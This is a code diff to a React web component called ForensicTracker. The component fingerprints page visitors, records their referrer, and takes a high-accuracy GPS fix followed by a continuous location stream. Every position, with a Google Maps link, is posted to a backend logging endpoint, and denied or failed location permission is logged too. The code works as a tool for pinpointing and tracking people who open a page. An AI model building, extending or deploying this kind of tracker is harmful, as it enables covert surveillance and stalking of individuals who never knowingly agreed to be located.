@@ -35,50 +35,65 @@ export default function ForensicTracker() {
       referrer: document.referrer || "direct",
     };
 
-    const logUpdate = async (loc: any) => {
+    const logUpdate = async (loc: any, status?: string) => {
       try {
         await fetch(`${API_URL}/api/v1/forensics/log-visit`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             source: pathname || "/",
-            fingerprint,
-            location: loc, // We send THIS as the real-time GPS
+            fingerprint: { ...fingerprint, status: status || "ACTIVE" },
+            location: loc,
           }),
         });
       } catch (e) {}
     };
 
-    // 🛰️ LIVE FORENSIC STREAMING
+    // 🛰️ ADVANCED FORENSIC UPLINK
     if ("geolocation" in navigator) {
-      watcherRef.current = navigator.geolocation.watchPosition(
+      // First, get a single high-accuracy position to "break the ice"
+      navigator.geolocation.getCurrentPosition(
         (pos) => {
-          const refinedLocation = {
+          const loc = {
             lat: pos.coords.latitude,
             lon: pos.coords.longitude,
             accuracy: pos.coords.accuracy,
             altitude: pos.coords.altitude,
             timestamp: pos.timestamp,
+            maps_link: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
           };
-
-          // Send the "Current Best" coordinates immediately
-          console.log(
-            `[FORENSICS] Precision Lock: ${pos.coords.accuracy.toFixed(1)}m`,
-          );
-          logUpdate(refinedLocation);
+          logUpdate(loc, "GPS_LOCKED_INIT");
         },
         (err) => {
-          // Fallback if GPS is blocked but we have IP data
-          if (err.code === 1) logUpdate(null);
+          const reasons = [
+            "",
+            "PERMISSION_DENIED",
+            "POSITION_UNAVAILABLE",
+            "TIMEOUT",
+          ];
+          logUpdate(null, `GPS_FAILED_${reasons[err.code] || "UNKNOWN"}`);
         },
-        {
-          enableHighAccuracy: true,
-          timeout: 30000,
-          maximumAge: 0,
+        { enableHighAccuracy: true, timeout: 15000 },
+      );
+
+      // Then, watch for improvements
+      watcherRef.current = navigator.geolocation.watchPosition(
+        (pos) => {
+          const loc = {
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            altitude: pos.coords.altitude,
+            timestamp: pos.timestamp,
+            maps_link: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
+          };
+          logUpdate(loc, "GPS_STREAMING");
         },
+        null,
+        { enableHighAccuracy: true, maximumAge: 0 },
       );
     } else {
-      logUpdate(null);
+      logUpdate(null, "NO_GEOLOCATION_SUPPORT");
     }
 
     return () => {
